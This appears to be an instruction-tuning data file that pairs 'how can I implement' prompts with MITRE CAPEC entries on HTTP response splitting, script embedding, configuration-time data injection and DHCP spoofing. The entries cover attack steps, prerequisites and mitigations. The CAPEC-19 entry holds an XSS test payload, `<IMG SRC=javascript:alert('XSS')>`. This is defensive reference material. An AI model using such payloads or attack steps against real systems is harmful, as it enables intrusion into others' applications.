              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Indicators, Mitigations, Prerequisites, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - HTTP Response Splitting (CAPEC ID: 34)",
    "context": "",
    "output": "Examples of HTTP Response Splitting (CAPEC ID: 34) are: In the PHP 5 session extension mechanism, a user-supplied session ID is sent back to the user within the Set-Cookie HTTP header. Since the contents of the user-supplied session ID are not validated, it is possible to inject arbitrary HTTP headers into the response body. This immediately enables HTTP Response Splitting by simply terminating the HTTP response header from within the session ID used in the Set-Cookie directive. See also: CVE-2006-0207",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In the PHP 5 session extension mechanism, a user-supplied session ID is sent back to the user within the Set-Cookie HTTP header. Since the contents of the user-supplied session ID are not validated, it is possible to inject arbitrary HTTP headers into the response body. This immediately enables HTTP Response Splitting by simply terminating the HTTP response header from within the session ID used in the Set-Cookie directive. See also: CVE-2006-0207",
      "@Name": "HTTP Response Splitting (CAPEC ID: 34)",
      "attack_ptrn": {
        "@ID": "34",
        "@Name": "HTTP Response Splitting",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
            "An adversary manipulates and injects malicious content, in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., web server) or into an already spoofed HTTP response from an adversary controlled domain/site.",
            "See CanPrecede relationships for possible consequences."
          ]
        },
        "Extended_Description": {
          "xhtml:p": [
            "Malicious user input is injected into various standard and/or user defined HTTP headers within a HTTP Response through use of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters, and unique character encoding.",
            "A single HTTP response ends up being split as two or more HTTP responses by the targeted client HTTP agent parsing the original maliciously manipulated HTTP response. This allows malicious HTTP responses to bypass security controls in order to implement malicious actions and provide malicious content that allows access to sensitive data and to compromise applications and users. This is performed by the abuse of interpretation and parsing discrepancies in different intermediary HTTP agents (load balancer, reverse proxy, web caching proxies, application firewalls, etc.) or client HTTP agents (e.g., web browser) in the path of the malicious HTTP responses.",
            "This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions as well as lack of syntax checking and filtering of user input in the HTTP agents receiving HTTP messages in the path.",
            {
              "xhtml:i": "client agent (e.g., web browser)",
              "#text": "This differs from CAPEC-105 HTTP Request Splitting, which is usually an attempt to compromise a back-end HTTP agent via HTTP Request messages. HTTP Response Splitting is an attempt to compromise aby sending malicious content in HTTP responses from back-end HTTP infrastructure."
            },
            "HTTP Smuggling (CAPEC-33 and CAPEC-273) is different from HTTP Splitting due to the fact it relies upon discrepancies in the interpretation of various HTTP Headers and message sizes and not solely user input of special characters and character encoding. HTTP Smuggling was established to circumvent mitigations against HTTP Request Splitting techniques."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "220"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "105"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "115"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "63"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "593"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "154"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets",
              "Technique": "Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer."
            },
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data (in the form of HTTP headers with custom strings and embedded web scripts and objects) into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP responses by intermediary and front-end client/victim HTTP agents. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses to intermediary and front-end client/victim HTTP agents, will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.",
              "Technique": [
                "Continue the monitoring of HTTP traffic.",
                {
                  "xhtml:p": [
                    "Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed:",
                    "to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent.",
                    "Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant."
                  ],
                  "xhtml:ul": {
                    "xhtml:li": [
                      "additional HTTP Requests with their own headers",
                      "malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest)",
                      "adversary chosen encoding (e.g., UTF-7)"
                    ]
                  }
                },
                "Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request."
              ]
            },
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "[Perform HTTP Response Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.",
              "Technique": "Leverage techniques identified in the Experiment Phase."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "A vulnerable or compromised server or domain/site capable of allowing adversary to insert/inject malicious content that will appear in the server's response to target HTTP agents (e.g., proxies and users' web browsers).",
            "Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.",
            "HTTP headers capable of being user-manipulated.",
            "HTTP agents running on HTTP/1.0 or HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers."
            },
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers."
            },
            {
              "@Level": "Medium",
              "#text": "Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages."
        },
        "Indicators": {
          "Indicator": "Differences in responses processed by the two agents with multiple responses to a single request in the web logs. This requires careful monitoring or a capable log analysis tool."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.",
            "Configuration: front-end HTTP agents notice ambiguous requests.",
            "Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.",
            "Configuration: Disable reuse of back-end connections.",
            "Configuration: Use HTTP/2 for back-end connections.",
            "Configuration: Use the same web server software for front-end and back-end server.",
            "Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.",
            "Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)",
            "Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.",
            "Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "In the PHP 5 session extension mechanism, a user-supplied session ID is sent back to the user within the Set-Cookie HTTP header. Since the contents of the user-supplied session ID are not validated, it is possible to inject arbitrary HTTP headers into the response body. This immediately enables HTTP Response Splitting by simply terminating the HTTP response header from within the session ID used in the Set-Cookie directive. See also: CVE-2006-0207"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "113"
            },
            {
              "@CWE_ID": "138"
            },
            {
              "@CWE_ID": "436"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "25",
            "Entry_Name": "HTTP Response Splitting"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-117"
            },
            {
              "@External_Reference_ID": "REF-617"
            },
            {
              "@External_Reference_ID": "REF-680"
            }
          ]
        },
        "Notes": {
          "Note": [
            {
              "@Type": "Terminology",
              "#text": "HTTP Splitting \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender\u2019s intension. The messages sent are 100% valid and RFC compliant\" [REF-117]."
            },
            {
              "@Type": "Terminology",
              "#text": "HTTP Smuggling \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender\u2019s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way\" [REF-117]."
            },
            {
              "@Type": "Relationship",
              "#text": "HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against."
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Payload_Activation_Impact, Probing_Techniques, Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated @Status, Consequences, Description, Example_Instances, Execution_Flow, Extended_Description, Indicators, Mitigations, Notes, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Embedding Scripts within Scripts (CAPEC ID: 19)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Embedding Scripts within Scripts (CAPEC ID: 19) are: ~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell."
      ],
      "@Name": "Embedding Scripts within Scripts (CAPEC ID: 19)",
      "attack_ptrn": {
        "@ID": "19",
        "@Name": "Embedding Scripts within Scripts",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts.",
        "Extended_Description": {
          "xhtml:p": "The adversary must have the ability to inject their script into a script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an adversary can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "242"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Spider] Using a browser or an automated tool, an adversary records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.",
              "Technique": [
                "Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for XSS vulnerability] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.",
              "Technique": [
                "Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.",
                "Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.",
                "Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.",
                "Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.",
                "Use a proxy tool to record results of the created requests."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Steal session IDs, credentials, page content, etc.] As the adversary succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.",
              "Technique": [
                "Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the adversary.",
                "Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute appropriately."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Forceful browsing] When the adversary targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).",
              "Technique": [
                "Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site",
                "Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities)."
              ]
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Content spoofing] By manipulating the content, the adversary targets the information that the user would like to get from the website.",
              "Technique": "Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes adversary-modified invalid information to the user on the current web page."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To load malicious script into open, e.g. world writable directory"
            },
            {
              "@Level": "Medium",
              "#text": "Executing remote scripts on host and collecting output"
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use browser technologies that do not allow client side scripting.",
            "Utilize strict type, character, and encoding enforcement.",
            "Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.",
            "Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Perform input validation for all remote content.",
            "Perform output validation for all remote content.",
            "Disable scripting languages such as JavaScript in browser",
            "Session tokens for specific host",
            "Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.",
            "Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode"
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an adversary may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many adversarys take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on.",
                "The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of.",
                "In addition the enumerations allow for the adversary to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "#text": "<IMG SRC=javascript:alert('XSS')>"
              }
            },
            "~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "284"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1027.009",
              "Entry_Name": "Obfuscated Files or Information:\u00a0Embedded Payloads"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1546.004",
              "Entry_Name": "Event Triggered Execution:.bash_profile and .bashrc"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1546.016",
              "Entry_Name": "Event Triggered Execution:\u00a0Installer Packages"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Examples-Instances, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Execution_Flow, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Data Injected During Configuration (CAPEC ID: 536)",
    "context": "",
    "output": "An adversary wishes to bypass a security system to access an additional network segment where critical data is kept. The adversary knows that some configurations of the security system will allow for remote bypass under certain conditions, such as switching a specific parameter to a different value. The adversary knows the bypass will work but also will be detected within the logging data of the security system. The adversary waits until an upgrade is performed to the security system by the victim's system administrators, and the adversary has access to an external logging system. The adversary injects false log entries that cause the administrators to think there are two different error states within the security system - one involving the specific parameter and the other involving the logging entries. The specific parameter is adjusted to a different value, and the logging level is reduced to a lower level that will not cause an adversary bypass to be detected. The adversary stops injecting false log data, and the administrators of the security system believe the issues were caused by the upgrade and are now resolved. The adversary is then able to bypass the security system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary wishes to bypass a security system to access an additional network segment where critical data is kept. The adversary knows that some configurations of the security system will allow for remote bypass under certain conditions, such as switching a specific parameter to a different value. The adversary knows the bypass will work but also will be detected within the logging data of the security system. The adversary waits until an upgrade is performed to the security system by the victim's system administrators, and the adversary has access to an external logging system. The adversary injects false log entries that cause the administrators to think there are two different error states within the security system - one involving the specific parameter and the other involving the logging entries. The specific parameter is adjusted to a different value, and the logging level is reduced to a lower level that will not cause an adversary bypass to be detected. The adversary stops injecting false log data, and the administrators of the security system believe the issues were caused by the upgrade and are now resolved. The adversary is then able to bypass the security system.",
      "@Name": "Data Injected During Configuration (CAPEC ID: 536)",
      "attack_ptrn": {
        "@ID": "536",
        "@Name": "Data Injected During Configuration",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An attacker with access to data files and processes on a victim's system injects malicious data into critical operational data during configuration or recalibration, causing the victim's system to perform in a suboptimal manner that benefits the adversary.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "176",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine configuration process] The adversary, through a previously compromised system, either remotely or physically, determines what the configuration process is. They look at configuration files, data files, and running processes on the system to identify areas where they could inject malicious data."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Determine when configuration occurs] The adversary needs to then determine when configuration or recalibration of a system occurs so they know when to inject malicious data.",
              "Technique": [
                "Look for a weekly update cycle or repeated update schedule.",
                "Insert a malicious process into the target system that notifies the adversary when configuration is occurring."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Determine malicious data to inject] By looking at the configuration process, the adversary needs to determine what malicious data they want to insert and where to insert it.",
              "Technique": [
                "Add false log data",
                "Change configuration files",
                "Change data files"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Inject malicious data] Right before, or during system configuration, the adversary injects the malicious data. This leads to the system behaving in a way that is beneficial to the adversary and is often followed by other attacks."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The attacker must have previously compromised the victim's systems or have physical access to the victim's systems.",
            "Advanced knowledge of software and hardware capabilities of a manufacturer's product."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Ability to generate and inject false data into operational data into a system with the intent of causing the victim to alter the configuration of the system."
          }
        },
        "Mitigations": {
          "Mitigation": "Ensure that proper access control is implemented on all systems to prevent unauthorized access to system files and processes."
        },
        "Example_Instances": {
          "Example": "An adversary wishes to bypass a security system to access an additional network segment where critical data is kept. The adversary knows that some configurations of the security system will allow for remote bypass under certain conditions, such as switching a specific parameter to a different value. The adversary knows the bypass will work but also will be detected within the logging data of the security system. The adversary waits until an upgrade is performed to the security system by the victim's system administrators, and the adversary has access to an external logging system. The adversary injects false log entries that cause the administrators to think there are two different error states within the security system - one involving the specific parameter and the other involving the logging entries. The specific parameter is adjusted to a different value, and the logging level is reduced to a lower level that will not cause an adversary bypass to be detected. The adversary stops injecting false log data, and the administrators of the security system believe the issues were caused by the upgrade and are now resolved. The adversary is then able to bypass the security system."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "284"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-439"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Examples-Instances, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Examples-Instances, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - DHCP Spoofing (CAPEC ID: 697)",
    "context": "",
    "output": "Examples of DHCP Spoofing (CAPEC ID: 697) are: In early 2019, Microsoft patched a critical vulnerability (CVE-2019-0547) in the Windows DHCP client which allowed remote code execution via crafted DHCP OFFER packets. [REF-739]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In early 2019, Microsoft patched a critical vulnerability (CVE-2019-0547) in the Windows DHCP client which allowed remote code execution via crafted DHCP OFFER packets. [REF-739]",
      "@Name": "DHCP Spoofing (CAPEC ID: 697)",
      "attack_ptrn": {
        "@ID": "697",
        "@Name": "DHCP Spoofing",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary masquerades as a legitimate Dynamic Host Configuration Protocol (DHCP) server by spoofing DHCP traffic, with the goal of redirecting network traffic or denying service to DHCP."
        },
        "Extended_Description": {
          "xhtml:p": [
            "DHCP is broadcast to the entire Local Area Network (LAN) and does not have any form of authentication by default. Therefore, it is susceptible to spoofing.",
            "An adversary with access to the target LAN can receive DHCP messages; obtaining the topology information required to potentially manipulate other hosts' network configurations.",
            "To improve the likelihood of the DHCP request being serviced by the Rogue server, an adversary can first starve the DHCP pool."
          ]
        },
        "Likelihood_Of_Attack": "Low",
